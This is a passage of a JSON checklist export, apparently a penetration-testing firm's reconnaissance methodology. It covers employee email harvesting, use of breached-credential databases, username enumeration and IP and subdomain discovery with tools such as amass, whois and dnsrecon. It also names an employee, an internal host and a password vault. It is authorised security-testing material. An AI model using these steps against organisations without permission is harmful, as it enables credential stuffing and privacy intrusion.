                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Employee - https://phonebook.cz [Manual]",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4124aec-2af0-11ee-919a-43fbb58d4dd1",
                        "ordinal": 10,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnter domain to get associated email addresses.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Email Addresses - Verify - Skype",
                        "state": 3,
                        "comments": 0,
                        "uid": "c414600c-2af0-11ee-91a5-67c62abbc6c0",
                        "ordinal": 15,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nTake a client email address (karl.fosaaen@netspi.com) and use Skype for Business to open a message dialog (Paste the email into the &quot;Find someone or dial a number&quot; box).\nIf the message dialog box shows the person's full name (Karl Fosaaen), job title, and/or availability (Online, offline, busy), then the client has federated Skype for Business.\nYou can use the Skype for Business VM and PowerSkype to confirm email addresses.\n\nKarl has a VM with SDK stuff already installed\n<ncode>10.2.84.100\nCorp-VM-Skype-Enum\n</ncode>\nUse AD creds to authenticate\n\n<h3>Reference</h3>\n<ncode>https://blog.netspi.com/attacking-federated-skype-powershell/\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Employee - Dehashed [Commercial API]",
                        "state": 2,
                        "comments": 1,
                        "uid": "c411509c-2af0-11ee-9195-eb19e3590511",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate known employees and emails. \n\n<b>NOTE: DO NOT</b> use credentials discovered within the data breach sets to attempt to login to websites that aren't directly associated with the client. For example, if Dehashed contains user credentials that were part of the LinkedIn data breach, do not attempt to use those credentials to log in to LinkedIn's website as that user.  The intent of these credentials is for credential stuffing and password guessing attacks against in-scope assets during an engagement.\n\n<h2>Variation: Dehashed.com - Automated Process</h2>\n1. Download and install the tool from  <a href='https://github.com/NetSPI/OSINT/tree/master/dehashed'><u>https://github.com/NetSPI/OSINT/tree/master/dehashed</u></a> \n\n2.  Install the dehashed script.\n<ncode> python -m pip install -r requirements.txt\n</ncode>\n3. Run the command with the company information. Also, ensure you run it against all federated domains, managed domains, and email domains.\n<ncode>python dehashed.py --company [COMPANYNAME] --domain [company.com]\n</ncode>\n4. Recover the collected information from the sorted_emails.txt file and attach it to the Documents section of the relevant Resolve project. \n\n<b>Note:</b> The most current license and API key can be found at password.netspi.com under the &quot;DeHashed&quot; vaulted password.\n \n<h2>Variation: Dashed.com - Manual Process</h2>\n1. Visit https://dehashed.com/.\n2. Grab the username and password from the &quot;DeHashed&quot; vaulted password from https://passwords.netspi.com (Consultants - OSINT list).\n3. Login.\n4. Search for credentials and users using in scope domains confirmed to support federated or managed authentication.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Email Addresses - Determine Format",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4116834-2af0-11ee-9196-47b6de217e3d",
                        "ordinal": 6,
                        "masterFindingId": 17063368,
                        "taskInstructions": "<h2>Instructions</h2>\nDetermine the company's email address format.\n\n<h3>Tips</h3>\nUsing the employee list you can usually infer a valid email address:\n<ul><li>First.last@company.com, F.last@company.com, Firstlast@company.com</li>\n<li>If you can identify a unique text from the company email footer you can use that as a good dork to find email address and actual emails posted to different sites on the internet.</li>\n<li>Consider reviewing emails registered to company owned IP blocks and domains.</li>\n</ul>\nThis site may be able to provide guidance if you are stuck:\n<ncode>https://www.email-format.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Usernames - Verify - Lync",
                        "state": 3,
                        "comments": 0,
                        "uid": "c410ea1c-2af0-11ee-9191-0b9cd8a945f5",
                        "ordinal": 19,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate usernames via Lync endpoints.\n\n<h3>References</h3>\n<ncode>https://github.com/nyxgeek/lyncsmash\n<a href='https://github.com/mdsecresearch/LyncSniper'>https://github.com/mdsecresearch/LyncSniper</a>\ninvoke-authenticate or invoke-authenticate0365\n</ncode>\nOptions for user names:\n<ncode>https://github.com/insidetrust/statistically-likely-usernames\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Usernames - Verify  Account - SMTP",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4143c08-2af0-11ee-91a4-6f3ae3dd05de",
                        "ordinal": 18,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 2,
                "id": 350451,
                "name": "Reconnaissance: IP Addresses (Not Required if Scope Has Been Provided by Client)",
                "description": "This goal of this task group is to identify IP address ranges associated with the client.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Enumerate Company's IP Ranges - Amass",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41570e6-2af0-11ee-91ac-df1bcfbc5978",
                        "ordinal": 5,
                        "masterFindingId": 17064483,
                        "taskInstructions": "<h2>Instructions</h2>\nOnce domain names and subdomains have been enumerated run amass against them in an attempt to identify additional ranges.  This can be useful for sites that live in hosted environments.  \n\n<b>Important Note: </b>You may want to consider running through the entire DNS recon process list for the sake of being complete.\n\n<h2><b>Variation: Amass</b></h2>\n1. Install amass via apt.\n<ncode>sudo apt install amass\n</ncode>\nOR via go.\n<ncode>go install -v github.com/OWASP/Amass/v3/...@master\n</ncode>\n2. Run amass against discovered domain names.\n<ncode>amass enum -d netspi.com\n</ncode>\n<h3>Example:</h3>\n<ncode><b>amass enum -d netspi.com</b>\n\nresolve-poc7.netspi.com\nresolve-poc5.netspi.com\nrepository-ext.netspi.com\nresolve-poc8.netspi.com\nresolve-poc10.netspi.com\n<b>[TRUNCATED]</b>\n\nOWASP Amass v3.19.2                               https://github.com/OWASP/Amass\n--------------------------------------------------------------------------------\n60 names discovered - cert: 47, scrape: 2, dns: 7, crawl: 1, archive: 3\n--------------------------------------------------------------------------------\nASN: 397919 - AS397919\n        76.76.14.0/24           13   Subdomain Name(s)\nASN: 15169 - GOOGLE - Google LLC\n        34.120.0.0/14           5    Subdomain Name(s)\nASN: 16509 - AMAZON-02 - Amazon.com, Inc.\n        2600:9000:2038::/45     8    Subdomain Name(s)\n        18.188.0.0/16           1    Subdomain Name(s)\n        13.227.36.0/22          4    Subdomain Name(s)\n        3.16.0.0/14             1    Subdomain Name(s)\n        3.20.0.0/14             1    Subdomain Name(s)\n        13.225.41.0/24          4    Subdomain Name(s)\n        108.156.88.0/21         4    Subdomain Name(s)\n        18.224.0.0/14           1    Subdomain Name(s)\n        18.66.248.0/22          4    Subdomain Name(s)\n        13.225.60.0/22          4    Subdomain Name(s)\n        99.84.36.0/22           4    Subdomain Name(s)\n        108.156.104.0/21        4    Subdomain Name(s)\nASN: 8075 - MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation\n        40.68.0.0/14            1    Subdomain Name(s)\n        13.64.0.0/11            4    Subdomain Name(s)\n        52.96.0.0/14            4    Subdomain Name(s)\n        2603:1000::/26          4    Subdomain Name(s)\n        52.146.0.0/15           1    Subdomain Name(s)\nASN: 0 - Reserved Network Address Blocks\n        240.0.0.0/4             1    Subdomain Name(s)\nASN: 54113 - FASTLY - Fastly\n        185.199.108.0/22        8    Subdomain Name(s)\n        2606:50c0:8000::/46     8    Subdomain Name(s)\nASN: 14618 - AMAZON-AES - Amazon.com, Inc.\n        54.144.0.0/14           3    Subdomain Name(s)\n        34.192.0.0/12           6    Subdomain Name(s)\n        34.224.0.0/12           3    Subdomain Name(s)\n        54.236.64.0/18          1    Subdomain Name(s)\n        50.17.0.0/16            1    Subdomain Name(s)\n        107.22.0.0/16           1    Subdomain Name(s)\n        3.208.0.0/12            5    Subdomain Name(s)\n        3.224.0.0/12            2    Subdomain Name(s)\n        54.164.0.0/15           2    Subdomain Name(s)\n        52.2.0.0/15             1    Subdomain Name(s)\n        54.166.0.0/15           1    Subdomain Name(s)\n        52.72.0.0/15            1    Subdomain Name(s)\n        54.92.128.0/17          1    Subdomain Name(s)\n        3.208.0.0/13            1    Subdomain Name(s)\n        18.204.0.0/14           1    Subdomain Name(s)\n        54.156.0.0/14           1    Subdomain Name(s)\n        35.168.0.0/13           2    Subdomain Name(s)\n        52.44.0.0/15            1    Subdomain Name(s)\n\nThe enumeration has finished\nDiscoveries are being migrated into the local database\n</ncode>\n3. Review domains, sub domains, and ip address ranges.\n\n<h2><b>Report Requirements</b></h2>\nRecord new discovered IP ranges and perform additional domain recon task against them.\n\n<h2><b>Additional Notes</b></h2>\nBelow are some potential tool links.\n<ul><li>https://github.com/yamakira/censys-enumeration</li>\n<li>https://github.com/OWASP/Amass/releases</li>\n<li>https://github.com/aboul3la/Sublist3r</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Black Box Scope Discovery",
                        "state": 3,
                        "comments": 0,
                        "uid": "c414d1b8-2af0-11ee-91a7-bb24eaddc0f2",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nThis scope should be used for any black box tests. If the client has provided in-scope IPs and domains this section is optional.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Enumerate Company's Subsidiaries",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4154ada-2af0-11ee-91ab-7f8e717c7921",
                        "ordinal": 2,
                        "masterFindingId": 17064480,
                        "taskInstructions": "<h2>Instructions</h2>\nIdentify subsidiaries for the target company.\n\n<h2><b>Variation: Manual Review</b></h2>\nReview sec filing for company information and a list of subsidiaries. Google and other online resources may also be good targets for supporting information. Google for the company name and common sec filing documents. Below are a few sample Google dorks.\n<ncode>site:www.sec.gov subsidiaries facebook\nsite:www.sec.gov subsidiaries facebook Exhibit 21\nsite:www.sec.gov subsidiaries facebook 10-k type\n</ncode>\nAlternatively, you can use the sev.gov search page at http://www.sec.gov/edgar/searchedgar/companysearch.html\n<b>Note:</b> https://www.crunchbase.com may also be useful for identifying acquired companies.\n\n<h2><b>Variation: Automated Review</b></h2>\n1. Download  and install <a href='https://github.com/NetSPI/NetblockTool/blob/bf5a668dc52089265d9c72df3feb4dcb23ba9798/README.md'>n</a>etblock tool from  <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.\n<ncode>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt\n</ncode>\n2.  Below are the subsidiary options.\n<ncode>Company Subsidiaries:\n-s        Fetch subsidiary information and return netblocks of all subsidiaries in\n          addition to initial target\n-sn       Company name to use when fetching subsidiaries\n-sp       Use alternate parsing method when fetching subsidiary information; use\n          if the default method isn't working as expected\n-so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)\n</ncode>\n3. Run the tool with the desired options.\n<ncode>python3 NetblockTool.py -v Company -s -sn companyname\n</ncode>\n<h2><b>Report Verification</b></h2>\nAdd a hyperlink to the checklist item notes that points to the sec.gov documents containing the company's information and subsidiaries. Also, copy the basic information in to the notes. Alternatively, they can be save as a .txt file and uploaded to the project Artifacts.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Enumerate Company's Legal Name",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4158c0c-2af0-11ee-91ad-838cad09742e",
                        "ordinal": 1,
                        "masterFindingId": 17064479,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nLook up the company's official name and state registration. Each company has to be registered with the Secretary of State in the state they are operating in. Each state has a Secretary of State website with a business search to look up full company name along with other useful information.\n\n<h2><b>Report Verification</b></h2>\nAdd a hyperlink to the checklist item notes that points to the secretary of state web page containing the company's information. Also, copy the basic information in to the notes.\n\n<h3><b>Additional Notes</b></h3>\nBelow is a list of each state and their website. <b>This was last updated 09/24/2018.</b>\n\nAlabama Secretary of State - http://sos.alabama.gov/\nAlaska - http://alaska.gov/\nArizona - https://azsos.gov/\nArkansas - https://www.sos.arkansas.gov/\nCalifornia - http://www.sos.ca.gov/\nColorado - https://www.sos.state.co.us/\nConnecticut - http://portal.ct.gov/sots\nDelaware - http://portal.ct.gov/sots\nDistrict of Coluimbia - https://os.dc.gov/\nFlorida - http://dos.myflorida.com/\nGeorgioa - http://sos.ga.gov/\nHawaii - https://portal.ehawaii.gov/\nIdaho - https://sos.idaho.gov/\nIllinios - https://www.cyberdriveillinois.com/\nIndiana - https://www.in.gov/sos/\nIowa - https://sos.iowa.gov/\nKansas - https://www.sos.ks.gov/\nKentrucky - https://www.sos.ky.gov/Pages/default.aspx\nLouisiana - https://www.sos.la.gov/Pages/default.aspx\nMaine - http://www.maine.gov/sos/\nMaryland - https://sos.maryland.gov/Pages/default.aspx\nMassachusetts - https://www.sec.state.ma.us/\nMichigan - https://www.michigan.gov/sos/\nMinnesoata - https://www.sos.state.mn.us/\nMississippi - http://www.sos.ms.gov/Pages/default.aspx\nMissouri - https://www.sos.mo.gov/\nMontana - http://sos.mt.gov/\nNebraska - http://www.sos.ne.gov/dyindex.html\nNevada - https://nvsos.gov/sos\nNew Hampshire - http://sos.nh.gov/\nNew Jersey - http://www.state.nj.us/state/\nNew Mexico - http://www.sos.state.nm.us/\nNew York - https://www.dos.ny.gov/\nNorth Carolina - https://www.sosnc.gov/\nNorth Dakota - http://sos.nd.gov/\nOhio - https://www.sos.state.oh.us/\nOklahoma - https://www.sos.ok.gov/\nOregon - http://sos.oregon.gov/Pages/index.aspx\nPennsylvania - http://www.dos.pa.gov/Pages/default.aspx\nPeurto Rico - https://estado.pr.gov/en/\nRhode Island - http://www.sos.ri.gov/\nSouth Carolina - https://www.scsos.com/\nSouth Dakota - https://sdsos.gov/\nTennessee - https://sos.tn.gov/\nTexas - https://www.sos.state.tx.us/\nUtah - https://www.utah.gov/government/secretary-of-state.html\nVermont - https://www.sec.state.vt.us/\nVirginia - https://www.virginia.gov/\nWashington - https://www.sos.wa.gov/\nWest Virginia - https://sos.wv.gov/Pages/default.aspx\nWisconsin - http://www.sos.state.wi.us/\nWyoming - http://soswy.state.wy.us/\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Enumerate Company's IP Ranges - Whois",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41504e4-2af0-11ee-91a9-4783d022fa1a",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nUse enumerated company and subsidiary names and IP address to identify additional IP ranges they own using whois services.\n\n<h2><b>Variation: WHOIS - ReferralServer Lookup</b></h2>\n1. Run a whois lookup against the target domain or IP. Look for a &quot;ReferralServer&quot;:\n<ncode><b>whois 38.122.55.16 | grep -i referral</b>\nReferralServer:  rwhois://rwhois.cogentco.com:4321\nFound a referral to rwhois.cogentco.com:4321.\n</ncode>\n2. Issue a subsequent whois query against the referral server, with a search term (e.g. partial company name) as the last parameter. Output may be limited / searches too generic. Additional, more specific queries will help narrow down the desired results.\n<ncode><b>whois -h rwhois.cogentco.com -p 4321 Wasmer</b>\n%rwhois V-1.5:0010b0:00 rwhois.cogentco.com (CGNT rwhoisd 0.0.0)\nWasmer, Schroeder, and Company (NET4-267A37101E) 38.122.55.16 - 38.122.55.19\nWasmer, Schroeder, and Company (NET4-268C8F481D) 38.140.143.72 - 38.140.143.79\nWasmer, Schroeder, and Company (NET6-200105500002009D70) 2001:550:2:9D::39:0 - 2001:550:2:9D::39:FFFF\n%ok\n</ncode>\n3. Below is an example of a broad search.\n<ncode><b>whois -h rwhois.cogentco.com -p 4321 &quot;Assured&quot;</b>\n%rwhois V-1.5:0010b0:00 rwhois.cogentco.com (CGNT rwhoisd 0.0.0)\nAssured Data Protection (NET4-261B690018) 38.27.105.0 - 38.27.105.255\nAssured Data Protection (NET4-2658F9901D) 38.88.249.144 - 38.88.249.151\nAssured Data Protection (NET4-268EDFD01D) 38.142.223.208 - 38.142.223.215\nAssured Data Protection (NET6-200105500002000170) 2001:550:2:1::2B:0 - 2001:550:2:1::2B:FFFF\nAssured Data Protection (NET6-200105500002002F70) 2001:550:2:2F::D0:0 - 2001:550:2:2F::D0:FFFF\n%error 330 Exceeded maximum objects limit\n</ncode>\n3. Below is the desired results from modified search term:\n<ncode><b>[~] whois -h rwhois.cogentco.com -p 4321 &quot;Guaranty&quot;</b>\n%rwhois V-1.5:0010b0:00 rwhois.cogentco.com (CGNT rwhoisd 0.0.0)\n<b><red>Assured Guaranty Municipal Corp DBA AGO (NET4-266873801D) 38.104.115.128 - 38.104.115.135</red></b>\n<b><red>Assured Guaranty Municipal Corp DBA AGO (NET4-268CF9801D) 38.140.249.128 - 38.140.249.135</red></b>\n<b><red>Assured Guaranty Municipal Corp DBA AGO (NET6-200105500002000470) 2001:550:2:4::1:0 - 2001:550:2:4::1:FFFF</red></b>\n<b><red>Assured Guaranty Municipal Corp DBA AGO (NET6-200105500002004E70) 2001:550:2:4E::15A:0 - 2001:550:2:4E::15A:FFFF</red></b>\n<b><red>Illinois Insurance Guaranty Fund (NET4-267C34C01C) 38.124.52.192 - 38.124.52.207</red></b>\n<b><red>%error 330 Exceeded maximum objects limit</red></b>\n</ncode>\n\n<h2><b>Additional Notes</b></h2>\nhttps://www.ripe.net/publications/docs/ripe-358&#35;23 may also be of some use.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Enumerate Company's IP Ranges - BGP",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41515ce-2af0-11ee-91aa-5bfe73d3640d",
                        "ordinal": 4,
                        "masterFindingId": 17064482,
                        "taskInstructions": "<h2>Instructions</h2>\nUse enumerated company and subsidiary names to identify IP ranges using a BGP search.\n\n<h2><b>Variation: Manual Review</b></h2>\n1. Use enumerated company and subsidiary names to identify IP ranges using a BGP search. The site is accessible at https://bgp.he.net/\n<b>Note:</b> Sometimes company's register their IP block under slightly different names.\n\n<h2><b>Report Requirements</b></h2>\nInclude a list of all discovered IP ranges in the task notes or attach them as a .txt file to the project documents.\n\n<h2><b>Additional Notes</b></h2>\nBelow is a quick nmap command to quickly parse IPs, IP ranges, and CIDR networks into a file containing only 1 IP address per line if needed.\n1. Place all in scope IPs, IP Ranges, and CIDR network into one file.\n2. Run the following command in linux to expand the ranges/networks  and create a new file with one IP per line.\n<ncode>nmap -sL -Pn -n -iL test1.txt | awk '{print $5}' | grep -v &quot;address&quot; | grep -v &quot;nmap&quot; | sort | uniq&gt; IPs_ClientProvided.txt\n</ncode>\n3. Import IPs_ClientProvided.txt into the Artifacts section for the project.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Enumerate Company's IP Ranges - Registries",
                        "state": 3,
                        "comments": 0,
                        "uid": "c414e50e-2af0-11ee-91a8-2f73196a5984",
                        "ordinal": 3,
                        "masterFindingId": 17064481,
                        "taskInstructions": "<h2>Instructions</h2>\nUse enumerated company and subsidiary names to identify IP ranges they own using common IP registries.\n\n<h2><b>Variation: Manual Review</b></h2>\nBelow is a list of the common IP registries:\n<ul><li>North America     http://www.arin.net</li>\n<li>Western Europe  http://www.ripe.net</li>\n<li>Asian Pacific        http://www.apnic.net</li>\n<li>Latin America      http://www.lacnic.net</li>\n<li>Africa (AfrNIC)     http://www.afrinic.net</li>\n</ul>\nBelow are the URLs where you can issue arin.net lookups manually.\n<ul><li>Old: https://whois.arin.net/ui/query.do</li>\n<li>New: https://search.arin.net/rdap/?query=ameriprise</li>\n</ul>\n<h2><b>Variation: Automated Review</b></h2>\n1. Download and install netblock tool from  <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.\n<ncode>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt\n</ncode>\n2.  Below are the subsidiary options.\n<ncode>Company Subsidiaries:\n-s        Fetch subsidiary information and return netblocks of all subsidiaries in\n          addition to initial target\n-sn       Company name to use when fetching subsidiaries\n-sp       Use alternate parsing method when fetching subsidiary information; use\n          if the default method isn't working as expected\n-so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)\n</ncode>\n3. Run the tool with the desired options.\n<ncode>python3 NetblockTool.py -v Company -s -sn companyname\n</ncode>\n<b>Additional Options</b>\n1. Currently under review, but consider using a personal account for now.  https://ipinfo.io/\n\n<h2><b>Report Requirements</b></h2>\nInclude a list of all discovered IP ranges in the task notes or upload them as a .txt file to the project Artifacts.\n\n<h2><b>Additional Notes</b></h2>\nBelow is a quick nmap command to quickly parse IPs, IP ranges, and CIDR networks into a file containing only 1 IP address per line if needed.\n1. Place all in scope IPs, IP Ranges, and CIDR network into one file.\n2. Run the following command in linux to expand the ranges/networks  and create a new file with one IP per line.\n<ncode>nmap -sL -Pn -n -iL test1.txt | awk '{print $5}' | grep -v &quot;address&quot; | grep -v &quot;nmap&quot; | sort | uniq&gt; IPs_ClientProvided.txt\n</ncode>\n3. Import IPs_ClientProvided.txt into the Artifacts section for the project.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 3,
                "id": 350452,
                "name": "Reconnaissance: Domain Names",
                "description": "This goal of this task group is to identify domains associated with in scope IP addresses owned by the client.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "SubDomains - Rapid7 OpenData",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4191138-2af0-11ee-91be-275c3f3b2df4",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nRapid7 stores a lot of internet data that can be used during recon and information gathering. Review data sets as needed to identify subdomains.\nData sets can be downloaded from https://opendata.rapid7.com/.\n\n<h2>Variation: rapid_dns_query.py</h2>\n<b>Note:</b> Jake Karnes has a POC available for querying in scope domains and IPS at: <a href='https://github.com/NetSPI/rapid_dns_query'>https://github.com/NetSPI/rapid_dns_query</a> \n\n<h3>Example:</h3>\n<ncode>python3 rapid_dns_query.py --domains .netspi. --ips 207.87.188.224/27 209.118.108.192/27 --profile athena_query --outputfile results.csv\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] SRV Records - Internal IPs",
                        "state": 2,
                        "comments": 0,
                        "uid": "c415c244-2af0-11ee-91ae-474cc1a8ad5f",
                        "ordinal": 11,
                        "masterFindingId": 17063349,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nEnumerate common DNS records and verify no internal IP addresses are exposed.\n<b>Note:</b> C:\\Windows\\System32\\drivers\\etc\\services contains a list of common service types. If you would like to use nslookup.\n\n<h2><b>Variation: dnsrecon</b></h2>\n1. Use dnsrecon and review the SRV records returned \n<ncode>dnsrecon -d [domain.com] -n [nameserver]\n</ncode>\n<h3>Example:</h3>\n<ncode>dnsrecon -d google.com\n[&#42;] std: Performing General Enumeration against: google.com...\n<b>[TRUNCATED]</b>\n[&#42;] Enumerating SRV Records\n[+]      SRV _ldap._tcp.google.com ldap.google.com 216.239.32.58 389\n[+]      SRV _ldap._tcp.google.com ldap.google.com 2001:4860:4802:32::3a 389\n[+]      SRV _caldav._tcp.google.com calendar.google.com 142.250.190.142 80\n[+]      SRV _caldav._tcp.google.com calendar.google.com 2607:f8b0:4009:814::200e 80\n[+]      SRV _caldavs._tcp.google.com calendar.google.com 142.250.190.142 443\n[+]      SRV _caldavs._tcp.google.com calendar.google.com 2607:f8b0:4009:814::200e 443\n[+]      SRV _carddavs._tcp.google.com google.com 142.250.191.174 443\n[+]      SRV _carddavs._tcp.google.com google.com 2607:f8b0:4009:819::200e 443\n[+]      SRV _xmpp-client._tcp.google.com alt4.xmpp.l.google.com 209.85.202.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt4.xmpp.l.google.com 2a00:1450:400b:c00::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com alt3.xmpp.l.google.com 64.233.186.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt3.xmpp.l.google.com 2800:3f0:4003:c00::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com xmpp.l.google.com 142.250.111.125 5222\n[+]      SRV _xmpp-client._tcp.google.com xmpp.l.google.com 2607:f8b0:4023:1401::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com alt1.xmpp.l.google.com 108.177.12.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt1.xmpp.l.google.com 2607:f8b0:400c:c08::7d 5222\n[+]      SRV _xmpp-client._tcp.google.com alt2.xmpp.l.google.com 172.253.62.125 5222\n[+]      SRV _xmpp-client._tcp.google.com alt2.xmpp.l.google.com 2607:f8b0:4004:c07::7d 5222\n[+]      SRV _jabber._tcp.google.com alt2.xmpp-server.l.google.com 172.253.62.125 5269\n[+]      SRV _jabber._tcp.google.com alt4.xmpp-server.l.google.com 209.85.202.125 5269\n[+]      SRV _jabber._tcp.google.com alt1.xmpp-server.l.google.com 108.177.12.125 5269\n[+]      SRV _jabber._tcp.google.com xmpp-server.l.google.com 142.251.4.125 5269\n[+]      SRV _jabber._tcp.google.com alt3.xmpp-server.l.google.com 64.233.186.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt4.xmpp-server.l.google.com 209.85.202.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt3.xmpp-server.l.google.com 64.233.186.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt1.xmpp-server.l.google.com 108.177.12.125 5269\n[+]      SRV _xmpp-server._tcp.google.com alt2.xmpp-server.l.google.com 172.253.62.125 5269\n[+]      SRV _xmpp-server._tcp.google.com xmpp-server.l.google.com 142.251.4.125 5269\n[+]      SRV _jabber-client._tcp.google.com alt1.xmpp.l.google.com 108.177.12.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt1.xmpp.l.google.com 2607:f8b0:400c:c08::7d 5222\n[+]      SRV _jabber-client._tcp.google.com alt4.xmpp.l.google.com 209.85.202.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt4.xmpp.l.google.com 2a00:1450:400b:c00::7d 5222\n[+]      SRV _jabber-client._tcp.google.com alt3.xmpp.l.google.com 64.233.186.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt3.xmpp.l.google.com 2800:3f0:4003:c00::7d 5222\n[+]      SRV _jabber-client._tcp.google.com alt2.xmpp.l.google.com 172.253.62.125 5222\n[+]      SRV _jabber-client._tcp.google.com alt2.xmpp.l.google.com 2607:f8b0:4004:c07::7d 5222\n[+]      SRV _jabber-client._tcp.google.com xmpp.l.google.com 142.250.111.125 5222\n[+]      SRV _jabber-client._tcp.google.com xmpp.l.google.com 2607:f8b0:4023:1401::7d 5222\n[+] 38 Records Found\n</ncode>\n<h2><b>Reporting Requirements</b></h2>\n<ul><li>Record any internal IP address in the task notes</li>\n<li>Add any new domains to the target domain list, but ensure it is hosted on an in scope system.</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Validate Discovered Domains Resolve to in Scope IPs",
                        "state": 2,
                        "comments": 1,
                        "uid": "c417bc8e-2af0-11ee-91b7-b3d1d411969f",
                        "ordinal": 12,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nVerify all domains discovery map back to in scope IP ranges prior to the start of testing.\n\n<h2>Variation: DNSFilter</h2>\nDNSFilter is a python script almost identical to ClientChecker. However, it will output the hostnames that are in-scope. Possible use case is having a giant list of hostnames found during DNS recon, and instead of going one by one and removing that specific hostname, just the in-scope hosts will be returned which you can add to your Nessus/Nexpose/WI scans.\n\n1. Download DNSFilter.\n<ncode>https://github.com/NetSPI/Scripts-Private/blob/master/ClientChecker\n</ncode>\n<h3>Example:</h3>\n<ncode>python dnsfilter.py -d file of [file of hostnames] -i [file of IPs]\n</ncode>\nInscope IPs (ips.txt)\n<ncode>10.2.21.40\n104.197.208.225\n10.2.21.2\n</ncode>\nDomain Names that were enumerated (hosts.txt)\n<ncode>correlatedvm.netspi.com\nftp.netspi.com\nabcd.netspi.com (no dns entry)\nsqlwiki.netspi.com (resolved IP not listed in in-scope IPs)\n</ncode>\nOutput:\n<ncode><b>python dnsfilter.py -i ips.txt -d hosts.txt</b>\n\nInscope Hostnames\ncorrelatedvm.netspi.com\nftp.netspi.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Subdomains - Security Trails",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4170a46-2af0-11ee-91b2-737945faa32b",
                        "ordinal": 14,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview subdomains for domains associate with the IP space.\nhttps://securitytrails.com/corp/pricing&#35;api\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
